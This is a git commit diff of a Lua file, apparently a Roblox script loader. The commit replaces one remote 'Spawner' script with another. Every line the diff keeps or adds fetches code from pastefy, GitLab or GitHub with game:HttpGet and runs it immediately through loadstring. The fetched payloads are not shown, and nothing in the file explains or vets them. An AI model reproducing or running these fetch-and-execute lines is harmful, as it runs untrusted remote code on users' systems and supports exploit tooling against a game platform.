4c714d80f01cb1edd627f0b1e726dbdc41426e78
fornamess <Romanpostik123@gmail.com>
2025-09-04 21:55:23 +0500

    Update gg.lua

--- gg.lua
+++ gg.lua
@@ -1,4 +1,3 @@
 loadstring(game:HttpGet("https://pastefy.app/x0YRK690/raw"))()
 
-local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-Spawner.Load()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
